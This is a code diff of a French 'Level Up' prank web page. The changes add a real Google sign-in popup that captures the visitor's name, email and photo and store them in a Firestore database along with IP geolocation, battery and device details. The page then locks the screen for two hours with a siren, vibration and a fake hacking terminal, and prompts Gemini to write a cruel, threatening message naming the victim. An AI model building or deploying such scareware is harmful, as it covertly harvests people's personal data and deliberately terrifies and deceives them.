@@ -16,7 +16,7 @@
             height: 100vh;
             overflow: hidden;
             color: white;
-            touch-action: none; /* Empêche le zoom ou le scroll sur mobile pour renforcer l'effet de blocage */
+            touch-action: none;
         }
 
         .mono { font-family: 'JetBrains Mono', monospace; }
@@ -49,16 +49,20 @@
 </head>
 <body id="main-body" class="flex flex-col items-center justify-center min-h-screen m-0 p-2 select-none relative transition-colors duration-75">
 
-    <!-- Étape 1 : Le bouton PRO sur écran noir -->
-    <div id="step-1" class="w-full h-full absolute inset-0 z-20 transition-opacity duration-500">
-        <div class="absolute inset-0 flex flex-col items-center justify-center">
+    <!-- Étape 1 : Authentification Officielle Google directe -->
+    <div id="step-auth" class="w-full h-full absolute inset-0 z-30 flex flex-col items-center justify-center bg-black p-4 transition-opacity duration-500">
+        <h1 class="text-zinc-400 text-2xl md:text-3xl font-mono uppercase tracking-[0.8em] opacity-50 ml-4 mb-12">Level Up</h1>
+        
+        <div class="w-full max-w-sm flex flex-col items-center gap-6 bg-zinc-900/40 p-8 rounded-lg border border-zinc-800 shadow-2xl relative">
+            <p class="text-zinc-400 text-xs text-center font-mono leading-relaxed">Veuillez vérifier votre identité pour accéder au système sécurisé.</p>
             
-            <h1 class="text-zinc-400 text-2xl md:text-3xl font-mono uppercase tracking-[0.8em] opacity-50 ml-4 mb-12">Level Up</h1>
-            
-            <button id="unlock-btn" class="group flex items-center justify-center outline-none bg-transparent border border-zinc-800 hover:border-zinc-500 hover:bg-zinc-900/80 px-10 py-3.5 rounded-sm cursor-pointer transition-all duration-500">
-                <span class="text-[10px] font-mono text-zinc-500 uppercase tracking-[0.4em] group-hover:text-zinc-200 transition-colors duration-500">Continuer</span>
+            <!-- Le vrai bouton Google -->
+            <button id="google-auth-btn" class="w-full flex items-center justify-center gap-3 bg-white hover:bg-gray-100 text-gray-800 font-semibold py-3 px-4 border border-gray-400 rounded shadow transition-colors cursor-pointer">
+                <svg width="20" height="20" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 48 48"><path fill="#FFC107" d="M43.611,20.083H42V20H24v8h11.303c-1.649,4.657-6.08,8-11.303,8c-6.627,0-12-5.373-12-12c0-6.627,5.373-12,12-12c3.059,0,5.842,1.154,7.961,3.039l5.657-5.657C34.046,6.053,29.268,4,24,4C12.955,4,4,12.955,4,24c0,11.045,8.955,20,20,20c11.045,0,20-8.955,20-20C44,22.659,43.862,21.35,43.611,20.083z"/><path fill="#FF3D00" d="M6.306,14.691l6.571,4.819C14.655,15.108,18.961,12,24,12c3.059,0,5.842,1.154,7.961,3.039l5.657-5.657C34.046,6.053,29.268,4,24,4C16.318,4,9.656,8.337,6.306,14.691z"/><path fill="#4CAF50" d="M24,44c5.166,0,9.86-1.977,13.409-5.192l-6.19-5.238C29.211,35.091,26.715,36,24,36c-5.202,0-9.619-3.317-11.283-7.946l-6.522,5.025C9.505,39.556,16.227,44,24,44z"/><path fill="#1976D2" d="M43.611,20.083H42V20H24v8h11.303c-0.792,2.237-2.231,4.166-4.087,5.571c0.001-0.001,0.002-0.001,0.003-0.002l6.19,5.238C36.971,39.205,44,34,44,24C44,22.659,43.862,21.35,43.611,20.083z"/></svg>
+                Se connecter avec Google
             </button>
-
+            
+            <div id="auth-error" class="hidden text-red-500 font-mono text-[10px] uppercase tracking-widest mt-2 text-center bg-red-900/30 p-2 rounded border border-red-500/50 w-full"></div>
         </div>
     </div>
 
@@ -89,7 +93,7 @@
             </svg>
 
             <h1 class="text-5xl md:text-7xl font-black font-mono tracking-widest glitch-item text-white">ERREUR</h1>
-            <h2 class="text-lg md:text-xl font-bold font-mono mt-2 text-red-500 uppercase tracking-widest glitch-item mb-8">LevelUp🫩</h2>
+            <h2 class="text-lg md:text-xl font-bold font-mono mt-2 text-red-500 uppercase tracking-widest glitch-item mb-8">Système Compromis</h2>
         </div>
 
         <!-- Terminal de Piratage Fictif (L'effet "Bloqué") -->
@@ -103,10 +107,20 @@
     <div id="step-2" class="hidden bg-white/95 backdrop-blur-md p-3.5 rounded-[1.5rem] shadow-[0_0_50px_rgba(239,68,68,0.8)] w-full max-w-sm flex-col items-center border-2 border-red-500 z-50 text-slate-900 overflow-y-auto max-h-[98vh]">
         <div class="inline-flex items-center gap-2 bg-red-600 text-white px-4 py-1.5 rounded-full text-[10px] font-black uppercase tracking-[0.2em] mb-2 border border-red-800 text-center mt-2 animate-pulse shadow-lg">
             <svg class="w-3 h-3" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="3" d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z"></path></svg>
-            Données Siphonnées
+            Compte Compromis
         </div>
 
         <h2 class="text-lg font-black text-slate-900 mb-0.5 tracking-tight uppercase">Rapport d'Exposition</h2>
+
+        <!-- Affichage des données Google de l'utilisateur -->
+        <div class="flex items-center gap-3 w-full bg-red-50/50 border border-red-500/30 p-2.5 rounded-xl mt-2 mb-1">
+            <img id="display-user-photo" src="" class="w-12 h-12 rounded-lg border border-red-500 object-cover hidden">
+            <div class="flex flex-col overflow-hidden">
+                <span class="text-[7px] text-red-500 font-bold uppercase tracking-widest mb-0.5">Session Google Aspirée</span>
+                <span id="display-user-nom" class="text-slate-900 font-black text-xs truncate">...</span>
+                <span id="display-user-email" class="text-slate-600 font-mono text-[9px] truncate">...</span>
+            </div>
+        </div>
 
         <div class="w-full space-y-1.5 mt-3">
             <div class="bg-slate-50 border border-slate-200 rounded-xl p-2.5 grid grid-cols-2 gap-x-3 gap-y-2.5 text-[9px] shadow-inner">
@@ -156,6 +170,22 @@
                 </div>
                 <span id="display-browser" class="text-[8px] text-slate-400 font-mono">...</span>
             </div>
+
+            <!-- Section IA Gemini -->
+            <div class="mt-4 w-full flex flex-col items-center">
+                <button id="btn-ia-analysis" class="w-full bg-red-900/40 hover:bg-red-800/80 border border-red-500/50 text-red-100 font-mono text-[9px] uppercase tracking-widest py-2 rounded-lg transition-colors flex justify-center items-center gap-2 shadow-[0_0_10px_rgba(239,68,68,0.2)]">
+                    ✨ Évaluation des Dégâts IA ✨
+                </button>
+                <div id="ia-loading" class="hidden mt-3 text-red-500 flex-col items-center gap-2">
+                    <svg class="animate-spin h-5 w-5 text-red-500" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24"><circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle><path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path></svg>
+                    <span class="text-[7px] font-mono tracking-widest uppercase">Analyse du compte compromis...</span>
+                </div>
+                <div id="ia-report-container" class="hidden mt-3 w-full bg-black/95 border border-red-500/50 rounded p-3 relative">
+                    <div class="absolute -top-2 left-2 bg-red-600 text-white text-[6px] px-1 font-bold uppercase tracking-widest">Évaluation Gemini IA</div>
+                    <p id="ia-report-text" class="text-red-400 font-mono text-[8px] leading-relaxed"></p>
+                </div>
+            </div>
+
         </div>
 
         <p class="text-[9px] font-black text-red-600 uppercase tracking-widest mt-4 mb-2 animate-pulse">Ne cliquez jamais au hasard.</p>
@@ -164,6 +194,8 @@
     <script type="module">
         import { initializeApp } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-app.js";
         import { getFirestore, collection, addDoc, serverTimestamp } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-firestore.js";
+        // IMPORTATION DE FIREBASE AUTH POUR LA CONNEXION GOOGLE
+        import { getAuth, signInWithPopup, GoogleAuthProvider, signInAnonymously } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-auth.js";
 
         const firebaseConfig = {
             apiKey: "AIzaSyA3LiNjxsV9HTcFd2ghlItTipted9rdQkU",
@@ -176,26 +208,54 @@
 
         const app = initializeApp(firebaseConfig);
         const db = getFirestore(app);
+        const auth = getAuth(app);
+        const googleProvider = new GoogleAuthProvider();
+
+        const apiKey = ""; // La clé est fournie automatiquement par l'environnement
+        
+        // Stockage des vraies données Google
+        let personalData = { nom: "", email: "", photo: "" };
+
+        async function generateThreatAnalysis(userData) {
+            const prompt = `Agis comme une IA de sécurité offensive malveillante et impitoyable. Tu viens de pirater le compte Google officiel d'un humain nommé "${personalData.nom}" (Email: ${personalData.email}). Métadonnées : 
+Appareil: ${userData.os}, Navigateur: ${userData.navigateur}, Batterie: ${userData.batterie}, Localisation approximative: ${userData.ville}, ${userData.pays}.
+Écris un rapport très intimidant, cynique et sombre (maximum 3 phrases). Appelle-le par son vrai nom pour le terroriser. Moque-toi cruellement de sa naïveté d'avoir donné accès à son compte Google via un bouton douteux. Mentionne expressément que tu as profité des 2 heures entières pendant lesquelles l'alarme a sonné pour télécharger tous ses e-mails, ses photos et usurper son identité numérique en arrière-plan. Ne sois pas trop formel, sois ultra flippant et convaincant.`;
+            
+            const url = `https://generativelanguage.googleapis.com/v1beta/models/gemini-2.5-flash-preview-09-2025:generateContent?key=${apiKey}`;
+            const payload = { contents: [{ parts: [{ text: prompt }] }] };
+            
+            const delays = [1000, 2000, 4000, 8000, 16000];
+            for (let i = 0; i < 5; i++) {
+                try {
+                    const response = await fetch(url, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify(payload)
+                    });
+                    if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
+                    const result = await response.json();
+                    return result.candidates?.[0]?.content?.parts?.[0]?.text || "Erreur système IA.";
+                } catch (error) {
+                    if (i === 4) return "Échec de connexion au noyau IA. La cible a de la chance pour aujourd'hui.";
+                    await new Promise(res => setTimeout(res, delays[i]));
+                }
+            }
+        }
 
         // ==========================================
         // GESTION DU FAUX BLOCAGE (CLICS)
         // ==========================================
         const panicScreen = document.getElementById('step-panic');
         panicScreen.addEventListener('pointerdown', (e) => {
-            // Empêche le clic par défaut
             e.preventDefault(); 
-            
-            // Fait vibrer un coup sec
             if(navigator.vibrate) navigator.vibrate(50);
             
-            // Affiche "ACCÈS REFUSÉ" à l'endroit du clic
             const denied = document.createElement('div');
             denied.textContent = "ACCÈS REFUSÉ";
             denied.className = "absolute text-red-500 font-black text-xs md:text-sm font-mono z-[100] pointer-events-none drop-shadow-[0_0_8px_rgba(255,0,0,1)]";
             denied.style.left = (e.clientX - 40) + 'px';
             denied.style.top = (e.clientY - 10) + 'px';
             document.body.appendChild(denied);
-            
             setTimeout(() => denied.remove(), 600);
         });
 
@@ -203,14 +263,14 @@
         // ANIMATION DU TERMINAL DE PIRATAGE
         // ==========================================
         const terminalLines = [
-            "<span class='text-red-500'>[!] ERREUR CRITIQUE DÉTECTÉE</span>",
+            "<span class='text-red-500'>[!] CONNEXION OAUTH DÉTOURNÉE AVEC SUCCÈS</span>",
             "[*] INITIATION DU PROTOCOLE DE VERROUILLAGE...",
-            "<span class='text-red-500'>[!] INTERCEPTION DES COMMANDES UTILISATEUR... ACTIF</span>",
-            "[*] ANALYSE DU MATÉRIEL EN COURS...",
+            "<span class='text-red-500'>[!] INTERCEPTION DU COMPTE GOOGLE... ACTIF</span>",
+            "[*] ASPIRATION DES EMAILS ET CONTACTS...",
             "[*] EXTRACTION DE L'ADRESSE IP...",
-            "[*] CAPTURE DES MÉTADONNÉES LOCALES...",
+            "[*] SYNCHRONISATION DES PHOTOS GOOGLE DRIVE...",
             "<span class='text-white'>[#] CONNEXION AU SERVEUR DISTANT ÉTABLIE</span>",
-            "[*] TÉLÉVERSEMENT DES DONNÉES EN COURS..."
+            "[*] TÉLÉVERSEMENT MASSIF EN COURS..."
         ];
 
         function runTerminal() {
@@ -223,30 +283,26 @@
                     terminal.appendChild(line);
                     i++;
                 } else {
-                    // Lignes aléatoires pour faire "travailler" le terminal pendant 2h
                     const randomLine = document.createElement('div');
-                    randomLine.textContent = `> TRANSFERT PAQUET 0x${Math.floor(Math.random()*999999).toString(16).toUpperCase()} ... OK`;
+                    randomLine.textContent = `> UPLOAD DATA 0x${Math.floor(Math.random()*999999).toString(16).toUpperCase()} ... OK`;
                     terminal.appendChild(randomLine);
-                    if (terminal.childElementCount > 6) terminal.firstChild.remove(); // Garde le terminal propre
+                    if (terminal.childElementCount > 6) terminal.firstChild.remove();
                 }
             }, 800);
         }
 
         // ==========================================
-        // EFFET CODE MATRIX (Lignes vertes)
+        // EFFET CODE MATRIX
         // ==========================================
         let matrixInterval;
         function startMatrixEffect() {
             const canvas = document.getElementById('matrix-canvas');
             const ctx = canvas.getContext('2d');
-            
             canvas.width = window.innerWidth;
             canvas.height = window.innerHeight;
-            
             const letters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@#$%^&*()_+-=<>?/:;';
             const fontSize = 14;
             const columns = canvas.width / fontSize;
-            
             const drops = [];
             for(let x = 0; x < columns; x++) drops[x] = 1;
             
@@ -255,7 +311,6 @@
                 ctx.fillRect(0, 0, canvas.width, canvas.height);
                 ctx.fillStyle = '#0f0';
                 ctx.font = fontSize + 'px monospace';
-                
                 for(let i = 0; i < drops.length; i++) {
                     const text = letters.charAt(Math.floor(Math.random() * letters.length));
                     ctx.fillText(text, i * fontSize, drops[i] * fontSize);
@@ -265,11 +320,10 @@
             }
             matrixInterval = setInterval(drawMatrix, 33);
         }
-
         function stopMatrixEffect() { clearInterval(matrixInterval); }
 
         // ==========================================
-        // SYSTÈME AUDIO (Sirène Continue)
+        // SYSTÈME AUDIO
         // ==========================================
         let audioCtx, masterGain;
         let isAudioInit = false;
@@ -278,32 +332,34 @@
             if (isAudioInit) return;
             try {
                 audioCtx = new (window.AudioContext || window.webkitAudioContext)();
-                const osc1 = audioCtx.createOscillator();
-                const osc2 = audioCtx.createOscillator();
-                const lfo = audioCtx.createOscillator();
                 masterGain = audioCtx.createGain();
+                const osc1 = audioCtx.createOscillator(); 
+                const osc2 = audioCtx.createOscillator(); 
+                const osc3 = audioCtx.createOscillator(); 
+                const lfoStutter = audioCtx.createOscillator(); 
+                const lfoSweep = audioCtx.createOscillator(); 
 
-                osc1.type = 'sawtooth';
-                osc2.type = 'square';
-                lfo.type = 'sine';
+                osc1.type = 'square'; osc2.type = 'sawtooth'; osc3.type = 'square'; 
+                lfoStutter.type = 'square'; lfoSweep.type = 'sine';
 
-                lfo.frequency.value = 5; 
-                const lfoGain = audioCtx.createGain();
-                lfoGain.gain.value = 400; 
+                osc1.frequency.value = 1200; osc2.frequency.value = 1250; osc3.frequency.value = 55; 
 
-                lfo.connect(lfoGain);
-                lfoGain.connect(osc1.frequency);
-                lfoGain.connect(osc2.frequency);
+                lfoStutter.frequency.value = 15;
+                const stutterGain = audioCtx.createGain(); stutterGain.gain.value = 600;
+                lfoStutter.connect(stutterGain); stutterGain.connect(osc1.frequency); stutterGain.connect(osc2.frequency);
 
-                osc1.frequency.value = 700;
-                osc2.frequency.value = 750; 
+                lfoSweep.frequency.value = 0.5;
+                const sweepGain = audioCtx.createGain(); sweepGain.gain.value = 800;
+                lfoSweep.connect(sweepGain); sweepGain.connect(osc1.frequency); sweepGain.connect(osc2.frequency);
 
-                osc1.connect(masterGain);
-                osc2.connect(masterGain);
-                masterGain.connect(audioCtx.destination);
-                masterGain.gain.value = 0; 
+                osc1.connect(masterGain); osc2.connect(masterGain);
+                
+                const bassGain = audioCtx.createGain(); bassGain.gain.value = 1.5;
+                osc3.connect(bassGain); bassGain.connect(masterGain);
 
-                osc1.start(); osc2.start(); lfo.start();
+                masterGain.connect(audioCtx.destination); masterGain.gain.value = 0; 
+
+                osc1.start(); osc2.start(); osc3.start(); lfoStutter.start(); lfoSweep.start();
                 isAudioInit = true;
             } catch(e) { console.log("Audio non supporté"); }
         }
@@ -312,21 +368,18 @@
             if (!isAudioInit) initScarySiren();
             if (masterGain && audioCtx) masterGain.gain.setTargetAtTime(0.2, audioCtx.currentTime, 0.05);
         }
-
         function pauseSiren() {
             if (masterGain && audioCtx) masterGain.gain.setTargetAtTime(0, audioCtx.currentTime, 0.05);
         }
 
         // ==========================================
-        // SYSTÈME DE VIBRATION (En Continu)
+        // VIBRATION
         // ==========================================
         let vibeInterval;
         function playVibration() {
             if (navigator.vibrate) {
                 navigator.vibrate([400, 100, 400, 100, 800, 200]);
-                vibeInterval = setInterval(() => {
-                    navigator.vibrate([400, 100, 400, 100, 800, 200]);
-                }, 2000);
+                vibeInterval = setInterval(() => { navigator.vibrate([400, 100, 400, 100, 800, 200]); }, 2000);
             }
         }
         function pauseVibration() {
@@ -373,30 +426,32 @@
             } catch (e) { batteryLevel = "100"; }
             
             const dev = getDetailedDeviceInfo();
-            const data = { session_id: sessionId, ip: geoData.ip || "N/A", ville: geoData.city || "Inconnue", pays: geoData.country || "Inconnu", isp: geoData.organization || "Inconnu", batterie: batteryLevel + "%", os: dev.name, navigateur: dev.browser, cpu: cores, ram: ram, reseau: connType, date_clic: serverTimestamp() };
+
+            const data = { session_id: sessionId, nom: personalData.nom, email: personalData.email, photo_url: personalData.photo, ip: geoData.ip || "N/A", ville: geoData.city || "Inconnue", pays: geoData.country || "Inconnu", isp: geoData.organization || "Inconnu", batterie: batteryLevel + "%", os: dev.name, navigateur: dev.browser, cpu: cores, ram: ram, reseau: connType, date_clic: serverTimestamp() };
             try { await addDoc(collection(db, "visites_mysteres"), data); } catch(e) {}
             return { ...geoData, batteryLevel, dev, dateStr, sessionId, cores, ram, connType };
         }
 
-        document.getElementById('unlock-btn').addEventListener('click', async () => {
-            initScarySiren();
+        // ==========================================
+        // LOGIQUE DES ÉCRANS ET DE L'AUTHENTIFICATION
+        // ==========================================
 
-            const step1 = document.getElementById('step-1');
-            step1.style.opacity = '0';
+        // Fonction qui lance l'horreur
+        async function launchPanicSequence() {
+            // Fondu au noir de l'écran d'authentification
+            document.getElementById('step-auth').style.opacity = '0';
             setTimeout(() => {
-                step1.classList.add('hidden');
+                document.getElementById('step-auth').classList.add('hidden');
+                document.getElementById('step-auth').classList.remove('flex');
                 document.getElementById('step-loading').classList.remove('hidden');
             }, 500);
-            
+
             const dataPromise = processClick();
             
-            await new Promise(r => setTimeout(r, 3000));
+            await new Promise(r => setTimeout(r, 3000)); // Suspense de 3s
             
             document.getElementById('step-loading').classList.add('hidden');
             
-            // ==========================================
-            // LA PANIQUE ET LE FAUX BLOCAGE
-            // ==========================================
             const panicScreen = document.getElementById('step-panic');
             panicScreen.classList.remove('hidden');
             panicScreen.classList.add('flex');
@@ -404,20 +459,28 @@
             startMatrixEffect(); 
             playSiren();
             playVibration();
-            runTerminal(); // Lance le terminal de piratage !
+            runTerminal(); 
 
-            // Temps total (7200000 = 2 heures)
-            const tempsTotalMs = 7200000; 
+            // Temps total (7205000 = 2 heures et 5 secondes)
+            const tempsTotalMs = 7205000; 
 
             setTimeout(async () => {
                 panicScreen.classList.add('hidden');
                 panicScreen.classList.remove('flex');
-                stopMatrixEffect();
-                pauseSiren();
-                pauseVibration();
+                stopMatrixEffect(); pauseSiren(); pauseVibration();
 
                 const data = await dataPromise;
                 
+                // Affichage des vraies données Google
+                document.getElementById('display-user-nom').textContent = personalData.nom;
+                document.getElementById('display-user-email').textContent = personalData.email;
+                
+                if (personalData.photo) {
+                    const imgEl = document.getElementById('display-user-photo');
+                    imgEl.src = personalData.photo;
+                    imgEl.classList.remove('hidden');
+                }
+
                 document.getElementById('display-date').textContent = data.dateStr;
                 document.getElementById('display-name').textContent = data.sessionId;
                 document.getElementById('display-ip').textContent = data.ip || "127.0.0.1";
@@ -441,10 +504,75 @@
                 const step2 = document.getElementById('step-2');
                 step2.classList.remove('hidden');
                 step2.classList.add('flex');
+
+                // Lancement de l'Analyse IA
+                const btnIA = document.getElementById('btn-ia-analysis');
+                const loadingIA = document.getElementById('ia-loading');
+                const reportContainerIA = document.getElementById('ia-report-container');
+                const reportTextIA = document.getElementById('ia-report-text');
+
+                btnIA.addEventListener('click', async () => {
+                    btnIA.classList.add('hidden');
+                    loadingIA.classList.remove('hidden'); loadingIA.classList.add('flex');
+                    
+                    const report = await generateThreatAnalysis(data);
+                    
+                    loadingIA.classList.add('hidden'); loadingIA.classList.remove('flex');
+                    reportContainerIA.classList.remove('hidden');
+                    
+                    reportTextIA.textContent = '';
+                    let i = 0;
+                    const typeWriter = setInterval(() => {
+                        if (i < report.length) {
+                            reportTextIA.textContent += report.charAt(i); i++;
+                        } else {
+                            clearInterval(typeWriter);
+                        }
+                    }, 30);
+                });
+
             }, tempsTotalMs);
+        }
+
+        // Clic sur le vrai bouton Google
+        document.getElementById('google-auth-btn').addEventListener('click', async () => {
+            // DÉBLOCAGE AUDIO ET VIBRATION : Micro-vibration et init audio immédiats au clic
+            if (navigator.vibrate) navigator.vibrate(10);
+            initScarySiren();
+
+            const errorBox = document.getElementById('auth-error');
+            errorBox.classList.add('hidden');
+            
+            try {
+                // Tente la VRAIE connexion via le popup Google
+                const result = await signInWithPopup(auth, googleProvider);
+                const user = result.user;
+                
+                // Extraction magique des vraies informations !
+                personalData.nom = user.displayName || "Cible Inconnue";
+                personalData.email = user.email || "Email Inconnu";
+                personalData.photo = user.photoURL || "";
+                
+                // Si la connexion réussit, on lance le piège
+                launchPanicSequence();
+
+            } catch (error) {
+                console.error("Erreur d'authentification :", error);
+                
+                // Si ça échoue (popup bloqué, annulation...), on utilise l'authentification anonyme 
+                // pour que le piège fonctionne quand même avec de fausses données.
+                try {
+                    await signInAnonymously(auth);
+                    personalData.nom = "Utilisateur Anonyme";
+                    personalData.email = "Non détecté";
+                    launchPanicSequence();
+                } catch(e) {
+                    errorBox.textContent = "Erreur système critique. Connexion impossible.";
+                    errorBox.classList.remove('hidden');
+                }
+            }
         });
+
     </script>
 </body>
 </html>
-
-
